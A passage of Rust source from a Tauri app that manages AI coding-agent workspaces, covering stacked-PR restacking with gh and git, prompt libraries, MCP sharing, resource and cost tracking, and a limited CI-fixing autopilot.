                Some((w.id, counts, c.into_iter().map(|f| f.path).collect::<Vec<_>>()))
            }))
            .collect();
        let fresh: Vec<(String, (u32, u32), Vec<String>)> = handles.into_iter().filter_map(|h| h.join().ok().flatten()).collect();
        let mut cache = st.lines.lock().unwrap();
        for (id, v, files) in fresh {
            cache.1.remove(&id);
            cache.0.insert(id.clone(), (std::time::Instant::now(), v, files));
            out.insert(id, v);
        }
        Ok(out)
    })
    .await
    .map_err(e)?
}

/// An agent or a git action changed this workspace: recount its lines next time.
fn mark_changed(st: &AppState, workspace_id: &str) {
    st.lines.lock().unwrap().1.insert(workspace_id.to_string());
}

// ---------- pull requests (gh) ----------

fn gh(dir: &str, args: &[&str]) -> Res<String> {
    let out = Command::new("gh").args(args).current_dir(dir).output().map_err(e)?;
    if !out.status.success() {
        return Err(String::from_utf8_lossy(&out.stderr).trim().to_string());
    }
    Ok(String::from_utf8_lossy(&out.stdout).to_string())
}

// ---------- stacked PRs ----------

/// The PR for `branch`, looked up from `dir`. A merged parent is often archived (its folder is
/// gone), so lookups for a parent run from the child's folder.
fn pr_for_branch(dir: &str, branch: &str) -> Res<Value> {
    let out = gh(dir, &["pr", "list", "--head", branch, "--state", "all", "--limit", "1", "--json", "number,url,state,title,isDraft,baseRefName,headRefOid"])?;
    Ok(serde_json::from_str::<Value>(&out).map_err(e)?.get(0).cloned().unwrap_or(Value::Null))
}

/// The workspace this one is stacked on, with its PR, or null when it isn't stacked.
#[tauri::command]
async fn stack_parent(app: AppHandle, id: String) -> Res<Value> {
    blocking(app, move |st| {
        let ws = st.db().workspace(&id).map_err(e)?;
        if ws.parent_id.is_empty() {
            return Ok(Value::Null);
        }
        let parent = st.db().workspace(&ws.parent_id).map_err(e)?;
        // From the poller when it has looked already; one gh call only before its first look.
        let pr = match cached_pr(st, &parent) {
            Some(pr) => pr,
            None => pr_for_branch(&ws.path, &parent.branch).unwrap_or(Value::Null),
        };
        if pr["state"] == "MERGED" {
            let _ = st.db().set_merged(&parent.id);
        }
        Ok(json!({"id": parent.id, "branch": parent.branch, "target": parent.target_branch, "state": parent.state, "pr": pr}))
    })
    .await
}

/// The parent's PR merged: move this workspace onto the branch it merged into. Rebases only this
/// branch's own commits there, pushes with a lease (never over someone else's push), points the
/// PR at the new base with `gh pr edit --base`, and takes the workspace off the stack.
/// Conflicts abort the rebase and change nothing; the UI then hands the job to the agent.
#[tauri::command]
async fn restack_workspace(app: AppHandle, id: String) -> Res<Value> {
    blocking(app, move |st| {
        let ws = st.db().workspace(&id).map_err(e)?;
        review::refuse_in_review(ws.review_pr)?;
        if ws.parent_id.is_empty() {
            return Err("This workspace isn't stacked on another one.".into());
        }
        let parent = st.db().workspace(&ws.parent_id).map_err(e)?;
        let parent_pr = pr_for_branch(&ws.path, &parent.branch)?;
        if parent_pr["state"] != "MERGED" {
            return Err("The parent PR hasn't merged yet. Try again once it has.".into());
        }
        // Where the parent merged, as GitHub says; else where it was meant to go.
        let new_base = parent_pr["baseRefName"].as_str().filter(|b| safe::branch_name(b)).unwrap_or(&parent.target_branch).to_string();
        if !safe::branch_name(&new_base) || !safe::branch_name(&parent.branch) {
            return Err(format!("\"{new_base}\" isn't a valid branch name."));
        }
        let dir = Path::new(&ws.path);
        // The parent's branch as git knows it here: the local one (archiving keeps it), else
        // origin's copy, else the PR's last head commit (its branch was deleted everywhere).
        let remote_parent = format!("origin/{}", parent.branch);
        let head_oid = parent_pr["headRefOid"].as_str().filter(|s| safe::object_id(s)).map(String::from);
        let parent_ref = if git::branch_exists(dir, &parent.branch) {
            parent.branch.clone()
        } else if git::git(dir, &["rev-parse", "--verify", "--quiet", &format!("refs/remotes/{remote_parent}")]).is_ok() {
            remote_parent
        } else {
            head_oid.ok_or("Can't find the parent's branch any more, so this needs a manual rebase.")?
        };
        let result = git::restack(dir, &new_base, &parent_ref).map_err(e)?;
        if result == "conflicts" {
            let fork = git::restack_fork(dir, &parent_ref).unwrap_or_default();
            return Ok(json!({"result": "conflicts", "base": new_base, "fork": fork}));
        }
        mark_changed(st, &id);
        // Update the branch on GitHub only if it is there already and differs. The lease is the
        // last fetched origin copy, so a push someone else made since is refused, not overwritten.
        let remote = format!("refs/remotes/origin/{}", ws.branch);
        let pushed = match git::git(dir, &["rev-parse", "--verify", "--quiet", &remote]) {
            Ok(theirs) if theirs != git::git(dir, &["rev-parse", "HEAD"]).map_err(e)? => {
                git::git(dir, &["push", "--quiet", "--force-with-lease", "origin", &ws.branch]).map_err(e)?;
                true
            }
            _ => false,
        };
        let pr = pr_for_branch(&ws.path, &ws.branch).unwrap_or(Value::Null);
        let mut retargeted = Value::Null;
        if pr["state"] == "OPEN" && pr["baseRefName"] != new_base.as_str() && let Some(n) = pr["number"].as_u64() {
            gh(&ws.path, &["pr", "edit", &n.to_string(), "--base", &new_base])?;
            retargeted = json!(n);
        }
        st.db().unstack(&id, &new_base).map_err(e)?;
        pr_poke(st, Some(&ws.repo_id), true);
        Ok(json!({"result": result, "base": new_base, "pushed": pushed, "pr": retargeted}))
    })
    .await
}

/// Open PRs in a repo, for "new workspace from a PR".
#[tauri::command]
async fn repo_prs(st: State<'_, AppState>, id: String) -> Res<Value> {
    let repo = st.db().repo(&id).map_err(e)?;
    let out = gh(&repo.root_path, &["pr", "list", "--state", "open", "--limit", "50", "--json", "number,title,headRefName,author,isDraft,updatedAt"])?;
    serde_json::from_str(&out).map_err(e)
}

/// Open issues in a repo (assigned to you first), for "new workspace from an issue".
#[tauri::command]
async fn repo_issues(st: State<'_, AppState>, id: String) -> Res<Value> {
    let repo = st.db().repo(&id).map_err(e)?;
    let out = gh(&repo.root_path, &["issue", "list", "--state", "open", "--limit", "100", "--json", "number,title,body,labels,assignees,url"])?;
    let mut v: Vec<Value> = serde_json::from_str(&out).map_err(e)?;
    let me = st.branch_prefix().to_string();
    v.sort_by_key(|i| !i["assignees"].as_array().is_some_and(|a| a.iter().any(|x| x["login"] == me.as_str())));
    Ok(Value::Array(v))
}

/// Start a new chat in a workspace with a chosen agent and mode, send it a prompt, and show it.
#[tauri::command]
async fn start_chat(app: AppHandle, st: State<'_, AppState>, id: String, agent: String, mode: String, title: String, text: String) -> Res<String> {
    let s = Session {
        id: new_id(), workspace_id: id.clone(), agent: agent::get(&agent).id().into(),
        agent_session_id: None, title, model: None, permission_mode: mode, effort: None,
    };
    st.db().insert_session(&s).map_err(e)?;
    let _ = app.emit("focus-session", json!({"workspace_id": id, "session_id": s.id}));
    send(app, st, s.id.clone(), text).await?;
    Ok(s.id)
}

#[tauri::command]
async fn sections(st: State<'_, AppState>) -> Res<Vec<store::Section>> {
    st.db().sections().map_err(e)
}

#[tauri::command]
async fn create_section(st: State<'_, AppState>, name: String) -> Res<store::Section> {
    let name = name.trim();
    if name.is_empty() { return Err("Give the section a name.".into()); }
    st.db().create_section(name).map_err(e)
}

#[tauri::command]
async fn rename_section(st: State<'_, AppState>, id: String, name: String) -> Res<()> {
    st.db().rename_section(&id, name.trim()).map_err(e)
}

#[tauri::command]
async fn delete_section(st: State<'_, AppState>, id: String) -> Res<()> {
    st.db().delete_section(&id).map_err(e)
}

/// Put a workspace in a section ("" takes it out).
#[tauri::command]
async fn set_section(st: State<'_, AppState>, id: String, section: String) -> Res<()> {
    st.db().set_section(&id, &section).map_err(e)
}

/// Memory used by nekotrail and everything it started (agents, terminals, dev servers), from `ps`.
/// Returns the total in MB and the biggest processes, for the toolbar's RAM meter.
#[tauri::command]
async fn resource_usage() -> Res<Value> {
    // Polled every 5s: keep `ps` off the async workers.
    let out = tauri::async_runtime::spawn_blocking(|| Command::new("ps").args(["-A", "-o", "pid=,ppid=,rss=,comm="]).output())
        .await
        .map_err(e)?
        .map_err(e)?;
    let text = String::from_utf8_lossy(&out.stdout);
    let rows: Vec<(u32, u32, u64, String)> = text
        .lines()
        .filter_map(|l| {
            let mut it = l.split_whitespace();
            let pid = it.next()?.parse().ok()?;
            let ppid = it.next()?.parse().ok()?;
            let rss = it.next()?.parse().ok()?;
            let comm = it.collect::<Vec<_>>().join(" ");
            Some((pid, ppid, rss, comm))
        })
        .collect();
    Ok(tree_usage(std::process::id(), &rows))
}

/// Sum resident memory over `root` and all its descendants. The web view's WebKit helper processes
/// are started by macOS outside this tree, so they are not counted. (On Linux WebKitGTK starts them
/// as our children, so they are.)
fn tree_usage(root: u32, rows: &[(u32, u32, u64, String)]) -> Value {
    let mut ours = std::collections::HashSet::from([root]);
    loop {
        let before = ours.len();
        for (pid, ppid, _, _) in rows {
            if ours.contains(ppid) {
                ours.insert(*pid);
            }
        }
        if ours.len() == before {
            break;
        }
    }
    let mut by_name: HashMap<String, u64> = HashMap::new();
    let mut total_kb = 0;
    for (pid, _, rss, comm) in rows {
        if ours.contains(pid) {
            total_kb += rss;
            let name = comm.rsplit('/').next().unwrap_or(comm).to_string();
            *by_name.entry(name).or_default() += rss;
        }
    }
    let mut top: Vec<(String, u64)> = by_name.into_iter().collect();
    top.sort_by_key(|t| std::cmp::Reverse(t.1));
    json!({
        "total_mb": total_kb / 1024,
        "top": top.into_iter().take(6).map(|(n, kb)| json!({"name": n, "mb": kb / 1024})).collect::<Vec<_>>(),
    })
}

/// Imported workspaces whose folders still live outside nekotrail's own folder (in Conductor's).
#[tauri::command]
async fn imported_outside(st: State<'_, AppState>) -> Res<Vec<String>> {
    let root = st.home.join("workspaces");
    Ok(st.db().workspaces(false).map_err(e)?.into_iter()
        .filter(|w| w.imported_from.is_some() && !Path::new(&w.path).starts_with(&root) && Path::new(&w.path).exists())
        .map(|w| w.id).collect())
}

/// Move imported workspaces into ~/nekotrail/workspaces with `git worktree move`, so cleaning up
/// Conductor can't delete them. Skips any with an agent running. Returns (moved, problems).
#[tauri::command]
async fn relocate_imported(st: State<'_, AppState>) -> Res<(usize, Vec<String>)> {
    let ids = imported_outside(st.clone()).await?;
    let running: Vec<String> = {
        let runs = st.runs.lock().unwrap();
        let db = st.db();
        ids.iter().filter(|id| db.sessions(id).map(|ss| ss.iter().any(|s| runs.running.contains_key(&s.id))).unwrap_or(false)).cloned().collect()
    };
    let (mut moved, mut problems) = (0, vec![]);
    for id in ids {
        let (ws, repo) = { let db = st.db(); let ws = db.workspace(&id).map_err(e)?; let repo = db.repo(&ws.repo_id).map_err(e)?; (ws, repo) };
        let label = if ws.title.is_empty() { ws.name.clone() } else { ws.title.clone() };
        if running.contains(&id) {
            problems.push(format!("{label}: an agent is working. Move it later."));
            continue;
        }
        let base = Path::new(&ws.path).file_name().map(|n| n.to_string_lossy().to_string()).unwrap_or_else(|| ws.name.clone());
        let dir = st.home.join("workspaces").join(&repo.name);
        let mut to = dir.join(&base);
        let mut n = 2;
        while to.exists() {
            to = dir.join(format!("{base}-{n}"));
            n += 1;
        }
        // Terminals hold the old folder open; close them first.
        for key in [format!("{id}:term"), format!("{id}:run"), format!("{id}:setup")] {
            st.ptys.close(&key);
        }
        match git::move_worktree(Path::new(&repo.root_path), Path::new(&ws.path), &to) {
            Ok(()) => {
                st.db().set_path(&id, &to.to_string_lossy()).map_err(e)?;
                moved += 1;
            }
            Err(err) => problems.push(format!("{label}: {err}")),
        }
    }
    Ok((moved, problems))
}

/// Link workspaces that got the same task (a bake-off).
#[tauri::command]
async fn set_pair(st: State<'_, AppState>, ids: Vec<String>) -> Res<String> {
    let pair = new_id();
    st.db().set_pair(&ids, &pair).map_err(e)?;
    Ok(pair)
}

/// What a workspace's agents did, for comparing a bake-off: turns, time, cost, errors.
#[tauri::command]
async fn workspace_stats(st: State<'_, AppState>, id: String) -> Res<Value> {
    let db = st.db();
    let (mut turns, mut errors, mut ms, mut cost) = (0u64, 0u64, 0u64, 0f64);
    let mut agent = String::new();
    for s in db.sessions(&id).map_err(e)? {
        agent = s.agent.clone();
        for ev in db.events(&s.id).map_err(e)? {
            if ev["kind"] == "done" {
                turns += 1;
                if ev["is_error"].as_bool().unwrap_or(false) { errors += 1; }
                ms += ev["duration_ms"].as_u64().unwrap_or(0);
                cost += ev["cost_usd"].as_f64().unwrap_or(0.0);
            }
        }
    }
    Ok(json!({"agent": agent, "turns": turns, "errors": errors, "duration_ms": ms, "cost_usd": cost}))
}

/// How each agent has done for you: turns, errors, time, cost and merged PRs.
#[tauri::command]
async fn agent_scorecard(st: State<'_, AppState>) -> Res<Vec<Value>> {
    let db = st.db();
    let costs: HashMap<String, f64> = {
        let mut m = HashMap::new();
        for (_, agent, c) in db.daily_costs(36500).map_err(e)? {
            *m.entry(agent).or_default() += c;
        }
        m
    };
    Ok(db.agent_scorecard().map_err(e)?.into_iter().map(|(agent, turns, errors, ms, merged)| json!({
        "agent": agent, "turns": turns, "errors": errors, "duration_ms": ms, "merged": merged,
        "cost_usd": costs.get(&agent).copied().unwrap_or(0.0),
    })).collect())
}

/// Spend per day and agent over the last 7 days (API-equivalent prices from the CLIs).
#[tauri::command]
async fn usage_summary(st: State<'_, AppState>) -> Res<Value> {
    let rows = st.db().daily_costs(7).map_err(e)?;
    let today = chrono::Utc::now().format("%Y-%m-%d").to_string();
    let total: f64 = rows.iter().map(|r| r.2).sum();
    let today_total: f64 = rows.iter().filter(|r| r.0 == today).map(|r| r.2).sum();
    let mut by_agent: HashMap<String, f64> = HashMap::new();
    for (_, a, c) in &rows {
        *by_agent.entry(a.clone()).or_default() += c;
    }
    Ok(json!({"today": today_total, "week": total, "by_agent": by_agent, "days": rows.iter().map(|r| json!({"day": r.0, "agent": r.1, "cost": r.2})).collect::<Vec<_>>()}))
}

/// Models and intelligence (effort) levels per agent. Built in, and refreshed from a local Conductor
/// install's model catalog when there is one, since that one is updated as new models ship.
#[tauri::command]
fn model_catalog() -> Value {
    let mut cat: Value = serde_json::from_str(include_str!("models.json")).unwrap_or(Value::Null);
    let fresh = importer::default_db_path().and_then(|db| {
        let c = rusqlite::Connection::open_with_flags(db, rusqlite::OpenFlags::SQLITE_OPEN_READ_ONLY).ok()?;
        let raw: String = c.query_row("SELECT value FROM settings WHERE key='model_catalog_cache'", [], |r| r.get(0)).ok()?;
        serde_json::from_str::<Value>(&raw).ok()
    });
    if let Some(h) = fresh.as_ref().map(|f| &f["catalog"]["harnesses"]) {
        for agent in ["claude", "codex"] {
            let Some(cfg) = h[agent]["configs"].as_array().and_then(|c| c.last()) else { continue };
            let allowed: &[&str] = if agent == "claude" { &["low", "medium", "high", "xhigh", "max"] } else { &["none", "low", "medium", "high", "xhigh", "max", "ultra"] };
            let models: Vec<Value> = cfg["models"].as_array().into_iter().flatten()
                .filter(|m| m["status"] == "picker" && m["wireName"].is_string())
                .map(|m| json!({
                    "id": m["wireName"], "label": m["label"], "new": m["isNew"].as_bool().unwrap_or(false),
                    "default_effort": m["defaultEffortLevel"],
                    "efforts": m["effortLevels"].as_array().into_iter().flatten().filter(|e| e.as_str().is_some_and(|e| allowed.contains(&e))).cloned().collect::<Vec<_>>(),
                }))
                .collect();
            if !models.is_empty() {
                let def = cfg["models"].as_array().into_iter().flatten().find(|m| m["id"] == cfg["defaultModel"]).map(|m| m["wireName"].clone());
                cat[agent]["models"] = json!(models);
                if let Some(d) = def { cat[agent]["default_model"] = d; }
            }
        }
    }
    cat
}

/// MCP servers the agent can use here, as the CLI reports them (`claude mcp list` / `codex mcp list`).
#[tauri::command]
async fn mcp_list(st: State<'_, AppState>, id: String, agent: String) -> Res<String> {
    let ws = st.db().workspace(&id).map_err(e)?;
    let harness = agent::get(&agent);
    let bin = harness.bin();
    let mut cmd = Command::new(bin);
    // Listing can start the repo's own servers, so untrusted repo config stays off here too.
    if untrusted_agent_config(&st, &ws, harness).is_some() {
        cmd.envs(harness.config_off_env().iter().copied());
    }
    let out = cmd.args(["mcp", "list"]).current_dir(&ws.path).stdin(Stdio::null()).output().map_err(|err| format!("Couldn't run {bin}: {err}. Check that it's installed."))?;
    let text = format!("{}{}", String::from_utf8_lossy(&out.stdout), String::from_utf8_lossy(&out.stderr));
    Ok(text.trim().to_string())
}

/// Every MCP server and skill Claude, Codex, Gemini and OpenCode have (user config, and this workspace's
/// project config), and which ones can be shared. Reads only.
#[tauri::command]
async fn mcp_share_overview(st: State<'_, AppState>, id: String) -> Res<mcpshare::Overview> {
    let ws = st.db().workspace(&id).map_err(e)?;
    let homes = mcpshare::Homes::from_env()?;
    Ok(mcpshare::overview(&homes, Some(Path::new(&ws.path))))
}

fn backup_stamp() -> String {
    chrono::Local::now().format("%Y%m%d-%H%M%S").to_string()
}

/// Exactly what "Add to <agent>" would write, secrets hidden, and why it can't yet if it can't.
#[tauri::command]
async fn mcp_share_preview(st: State<'_, AppState>, id: String, name: String, target: mcpshare::AgentId, choices: HashMap<String, String>) -> Res<mcpshare::Preview> {
    let ws = st.db().workspace(&id).map_err(e)?;
    mcpshare::preview(&mcpshare::Homes::from_env()?, Some(Path::new(&ws.path)), &name, target, &choices, &backup_stamp())
}

/// Writes what the preview with `token` showed, after a backup. Refuses if the file moved since.
#[tauri::command]
async fn mcp_share_apply(st: State<'_, AppState>, id: String, name: String, target: mcpshare::AgentId, choices: HashMap<String, String>, token: String) -> Res<mcpshare::Applied> {
    let ws = st.db().workspace(&id).map_err(e)?;
    mcpshare::apply(&mcpshare::Homes::from_env()?, Some(Path::new(&ws.path)), &name, target, &choices, &token, &backup_stamp())
}

/// Links a skill folder for the other agents ("agents": Codex, Gemini and OpenCode, "claude": Claude).
#[tauri::command]
async fn skill_share(name: String, target: String) -> Res<String> {
    mcpshare::share_skill(&mcpshare::Homes::from_env()?, &name, &target)
}

/// Every prompt for a workspace (its repo's prompts as on its branch) or, with no workspace, a
/// repo's main checkout; personal prompts either way. The bool is false until the personal list
/// was first saved, so the app can bring over the old snippets once.
fn prompt_entries(st: &AppState, id: Option<&str>, repo: Option<&str>) -> Res<(Vec<prompts::Entry>, bool)> {
    let dir = match (id, repo) {
        (Some(id), _) => Some(PathBuf::from(st.db().workspace(id).map_err(e)?.path)),
        (None, Some(r)) => Some(PathBuf::from(st.db().repo(r).map_err(e)?.root_path)),
        _ => None,
    };
    let (personal, saved) = personal_prompts(st)?;
    let home = dirs::home_dir();
    let (repo_list, claude) = match &dir {
        Some(d) => (prompts::repo_prompts(d), prompts::claude_commands(d, home.as_deref())),
        None => (vec![], prompts::claude_commands(Path::new("/nonexistent"), home.as_deref())),
    };
    Ok((prompts::merge(personal, repo_list, claude), saved))
}

fn personal_prompts(st: &AppState) -> Res<(Vec<prompts::Prompt>, bool)> {
    match st.db().setting(prompts::STORE_KEY).map_err(e)? {
        Some(t) => Ok((serde_json::from_str(&t).unwrap_or_default(), true)),
        None => Ok((vec![], false)),
    }
}

fn save_personal(st: &AppState, list: Vec<prompts::Prompt>) -> Res<()> {
    let list = prompts::validate(list)?;
    st.db().set_setting(prompts::STORE_KEY, &serde_json::to_string(&list).map_err(e)?).map_err(e)
}

#[tauri::command]
async fn prompts_list(app: AppHandle, id: Option<String>, repo: Option<String>) -> Res<Value> {
    blocking(app, move |st| {
        let (entries, saved) = prompt_entries(st, id.as_deref(), repo.as_deref())?;
        Ok(json!({ "entries": entries, "saved": saved }))
    })
    .await
}

/// Replaces the personal list. Repo and Claude prompts are never written: they aren't in it.
#[tauri::command]
async fn prompts_save(st: State<'_, AppState>, list: Vec<prompts::Prompt>) -> Res<()> {
    save_personal(&st, list)
}

/// Copies any prompt (a read-only one too) into the personal list and returns the copy's name.
#[tauri::command]
async fn prompts_duplicate(app: AppHandle, id: Option<String>, repo: Option<String>, name: String, scope: prompts::Scope) -> Res<String> {
    blocking(app, move |st| {
        let (entries, _) = prompt_entries(st, id.as_deref(), repo.as_deref())?;
        let found = entries.iter().find(|x| x.name == name && x.scope == scope).ok_or_else(|| format!("/{name} isn't there any more."))?;
        let taken: Vec<String> = entries.iter().map(|x| x.name.clone()).collect();
        let copy = prompts::duplicate(found, &taken);
        let out = copy.name.clone();
        let (mut personal, _) = personal_prompts(st)?;
        personal.push(copy);
        save_personal(st, personal)?;
        Ok(out)
    })
    .await
}

/// Writes the personal list to a JSON file the user picked.
#[tauri::command]
async fn prompts_export(st: State<'_, AppState>, path: String) -> Res<usize> {
    let (list, _) = personal_prompts(&st)?;
    std::fs::write(&path, prompts::export(&list)).map_err(e)?;
    Ok(list.len())
}

/// Adds the prompts in an export file. Never overwrites one you have.
#[tauri::command]
async fn prompts_import(st: State<'_, AppState>, path: String) -> Res<prompts::Imported> {
    let text = std::fs::read_to_string(&path).map_err(e)?;
    let (cur, _) = personal_prompts(&st)?;
    let (list, rep) = prompts::import(&cur, &text)?;
    save_personal(&st, list)?;
    Ok(rep)
}

/// Values for the built-in blanks: the branch, its target, and the files it changed.
#[tauri::command]
async fn prompt_context(app: AppHandle, id: String) -> Res<Value> {
    blocking(app, move |st| {
        let ws = st.db().workspace(&id).map_err(e)?;
        let files = git::changes(Path::new(&ws.path), &ws.target_branch).map(|c| c.into_iter().map(|f| f.path).collect::<Vec<_>>().join("\n")).unwrap_or_default();
        Ok(json!({ "branch": ws.branch, "base": ws.target_branch, "files_changed": files }))
    })
    .await
}

/// Collision radar: active workspaces in one repo changing the same files, grouped, each group in
/// a suggested merge order. Reads only the file lists `line_counts` cached, so it runs no git at
/// all; a workspace not counted yet is simply left out until it is. `prs` is the PR state per
/// workspace the UI already has from the PR poller.
#[tauri::command]
async fn collisions(st: State<'_, AppState>, prs: HashMap<String, String>) -> Res<Vec<radar::Group>> {
    let wss = st.db().workspaces(false).map_err(e)?;
    let cache = st.lines.lock().unwrap();
    let entries: Vec<radar::Entry> = wss
        .iter()
        .filter_map(|w| {
            let c = cache.0.get(&w.id)?;
            Some(radar::Entry { id: &w.id, repo: &w.repo_id, created: &w.created_at, lines: c.1.0 + c.1.1, files: &c.2, pr: prs.get(&w.id).map(String::as_str) })
        })
        .collect();
    Ok(radar::collisions(&entries))
}

/// Disk used by each workspace folder, and how much of it is build output that can be cleaned.
#[tauri::command]
async fn workspace_storage(app: AppHandle) -> Res<Vec<Value>> {
    tauri::async_runtime::spawn_blocking(move || {
        let wss = app.state::<AppState>().db().workspaces(false).map_err(e)?;
        let handles: Vec<_> = wss.into_iter().map(|w| std::thread::spawn(move || {
            let p = Path::new(&w.path);
            if !p.exists() { return None; }
            let dirs = git::cleanable(p);
            Some(json!({
                "workspace_id": w.id, "total_kb": git::dir_kb(p),
                "cleanable_kb": dirs.iter().map(|d| d.1).sum::<u64>(),
                "dirs": dirs.iter().map(|d| json!({"path": d.0, "kb": d.1})).collect::<Vec<_>>(),
            }))
        })).collect();
        Ok(handles.into_iter().filter_map(|h| h.join().ok().flatten()).collect())
    })
    .await
    .map_err(e)?
}

/// Free space on the disk that holds nekotrail's workspaces, in MB.
#[tauri::command]
async fn free_disk_mb(st: State<'_, AppState>) -> Res<u64> {
    let dir = st.home.parent().unwrap_or(&st.home).to_path_buf();
    let out = tauri::async_runtime::spawn_blocking(move || Command::new("df").arg("-k").arg(dir).output())
        .await
        .map_err(e)?
        .map_err(e)?;
    let text = String::from_utf8_lossy(&out.stdout);
    let avail = text.lines().nth(1).and_then(|l| l.split_whitespace().nth(3)).and_then(|n| n.parse::<u64>().ok()).unwrap_or(0);
    Ok(avail / 1024)
}

/// Delete a workspace's build output (git-ignored dependency and build folders). Returns KB freed.
#[tauri::command]
async fn clean_workspace(app: AppHandle, id: String) -> Res<u64> {
    tauri::async_runtime::spawn_blocking(move || {
        let st = app.state::<AppState>();
        let busy = {
            let runs = st.runs.lock().unwrap();
            st.db().sessions(&id).map(|ss| ss.iter().any(|s| runs.running.contains_key(&s.id))).unwrap_or(false)
        };
        if busy {
            return Err("An agent is working in this workspace. Clean it when it's done.".to_string());
        }
        let ws = st.db().workspace(&id).map_err(e)?;
        Ok(git::clean(Path::new(&ws.path)))
    })
    .await
    .map_err(e)?
}

// ---------- autopilot: drive a PR to green without you ----------

const AUTOPILOT_TRIES: u64 = 3;

/// What a PR needs next, judged from `gh pr list --json` output. Pure, so it can be tested.
/// Returns (kind, fingerprint): kind is "fix", "conflicts", "review", "ready", "wait" or "closed".
fn autopilot_next(pr: &Value) -> (&'static str, String) {
    let sha = pr["headRefOid"].as_str().unwrap_or("").to_string();
    match pr["state"].as_str() {
        Some("MERGED") | Some("CLOSED") => return ("closed", sha),
        None => return ("wait", sha),
        _ => {}
    }
    let checks = pr["statusCheckRollup"].as_array().cloned().unwrap_or_default();
    let result = |c: &Value| c["conclusion"].as_str().or(c["state"].as_str()).or(c["status"].as_str()).unwrap_or("").to_uppercase();
    let failing = checks.iter().any(|c| ["FAILURE", "ERROR", "TIMED_OUT", "STARTUP_FAILURE"].contains(&result(c).as_str()));
    let pending = checks.iter().any(|c| ["", "PENDING", "QUEUED", "IN_PROGRESS", "EXPECTED", "WAITING"].contains(&result(c).as_str()));
    if pr["mergeable"] == "CONFLICTING" {
        ("conflicts", format!("conflicts:{sha}"))
    } else if failing && !pending {
        ("fix", format!("fix:{sha}"))
    } else if pr["reviewDecision"] == "CHANGES_REQUESTED" {
        ("review", format!("review:{sha}"))
    } else if pending {
        ("wait", sha)
    } else {
        ("ready", format!("ready:{sha}"))
    }
}

fn autopilot_key(id: &str) -> String {
    format!("autopilot:{id}")
}

/// Turn autopilot on or off for a workspace. On: nekotrail keeps the PR moving (fix CI, resolve
/// conflicts, answer requested changes) for up to 3 agent turns, then hands back to you.
#[tauri::command]
async fn set_autopilot(app: AppHandle, st: State<'_, AppState>, id: String, on: bool) -> Res<()> {
    let key = autopilot_key(&id);
    if on {
        // Autopilot fixes CI and merges: nothing it may do on someone else's PR.
        review::refuse_in_review(st.db().workspace(&id).map_err(e)?.review_pr)?;
        st.db().set_setting(&key, &json!({"tries": 0, "last": ""}).to_string()).map_err(e)?;
        // The poller looks right away (and every 20 s from now on) and runs autopilot after.
        pr_poke_workspace(&st, &id, true);
    } else {
        st.db().delete_setting(&key).map_err(e)?;
    }
    let _ = app.emit("autopilot", json!({"workspace_id": key.trim_start_matches("autopilot:"), "state": if on { "on" } else { "off" }}));
    Ok(())
}

/// Workspaces with autopilot on, and how many agent turns it has used.
#[tauri::command]
async fn autopilot_status(st: State<'_, AppState>) -> Res<HashMap<String, u64>> {
    Ok(st.db().settings_with_prefix("autopilot:").map_err(e)?.into_iter()
        .map(|(k, v)| (k.trim_start_matches("autopilot:").to_string(), serde_json::from_str::<Value>(&v).ok().and_then(|j| j["tries"].as_u64()).unwrap_or(0)))
        .collect())
}

/// One look at one workspace's PR, acting if something needs doing.
fn autopilot_tick(app: &AppHandle, id: &str) {
    let st = app.state::<AppState>();
    let key = autopilot_key(id);
    let Some(raw) = st.db().setting(&key).ok().flatten() else { return };
    let mut state: Value = serde_json::from_str(&raw).unwrap_or(json!({"tries": 0, "last": ""}));
    let busy = {
        let runs = st.runs.lock().unwrap();
        st.db().sessions(id).map(|ss| ss.iter().any(|s| runs.running.contains_key(&s.id))).unwrap_or(true)
    };
    if busy {
        return;
    }
    let ws = st.db().workspace(id);
    let Some(pr) = ws.ok().and_then(|w| cached_pr(&st, &w)) else { return };
    let (kind, print) = autopilot_next(&pr);
    let say = |state: &str, detail: &str| { let _ = app.emit("autopilot", json!({"workspace_id": id, "state": state, "detail": detail})); };
    match kind {
        "wait" => return,
        "closed" | "ready" => {
            let _ = st.db().delete_setting(&key);
            if kind == "ready" {
                say("ready", "Checks pass and nothing is waiting on the agent. Ready for you to merge.");
            } else {
                say("off", "The PR is closed or merged.");
            }
            return;
        }
        _ => {}
    }
    if state["last"].as_str() == Some(print.as_str()) {
        return; // already acted on this exact commit; wait for CI or the reviewer
    }
    let tries = state["tries"].as_u64().unwrap_or(0);
    if tries >= AUTOPILOT_TRIES {
        let _ = st.db().delete_setting(&key);
        say("gave_up", &format!("Still not green after {AUTOPILOT_TRIES} tries. Take a look."));
        return;
    }
    let Ok(ws) = st.db().workspace(id) else { return };
    let prompt = match kind {
        "fix" => {
            let logs = failing_logs_blocking(&st, id).unwrap_or_default();
            format!("Autopilot: CI is failing on this PR. Failing logs:\n\n```\n{}\n```\n\nFind the cause, fix it, run the relevant tests locally, then commit and push.", &logs[logs.len().saturating_sub(12000)..])
        }
        "conflicts" => {
            let _ = git::merge_target(Path::new(&ws.path), &ws.target_branch);
            format!("Autopilot: this PR conflicts with origin/{}. I started the merge (see `git status`). Resolve each conflict keeping the intent of both sides, run the tests, commit the merge and push.", ws.target_branch)
        }
        _ => {
            let comments = review_comments_blocking(&st, id).unwrap_or(Value::Null);
            let list: Vec<String> = comments.as_array().into_iter().flatten()
                .filter(|c| c["reply_to"].is_null() && !c["outdated"].as_bool().unwrap_or(false))
                .map(|c| format!("- {}:{} (@{}): {}", c["path"].as_str().unwrap_or(""), c["line"], c["user"].as_str().unwrap_or(""), c["body"].as_str().unwrap_or("")))
                .collect();
            format!("Autopilot: a reviewer requested changes on this PR. Address these comments, then commit and push:\n\n{}", list.join("\n"))
        }
    };
    let sid = match st.db().sessions(id).ok().and_then(|mut s| s.pop()) {
        Some(s) => s.id,
        None => return,
    };
    state["tries"] = json!(tries + 1);
    state["last"] = json!(print);
    let _ = st.db().set_setting(&key, &state.to_string());
    say("working", match kind { "fix" => "Fixing failing checks", "conflicts" => "Resolving conflicts", _ => "Addressing review comments" });
    let _ = start_turn(app.clone(), &st, sid, prompt);
}

/// Commit everything and push. An empty message uses the chat's first task as the subject.
#[tauri::command]
async fn commit_push(st: State<'_, AppState>, id: String, message: String) -> Res<String> {
    let ws = st.db().workspace(&id).map_err(e)?;
    review::refuse_in_review(ws.review_pr)?;
    mark_changed(&st, &ws.id);
    let dir = Path::new(&ws.path);
    let msg = if message.trim().is_empty() {
        st.db().sessions(&id).ok().and_then(|s| s.into_iter().map(|s| s.title).find(|t| t != "New chat")).unwrap_or_else(|| "Work in progress".into())
    } else {
        message.trim().to_string()
    };
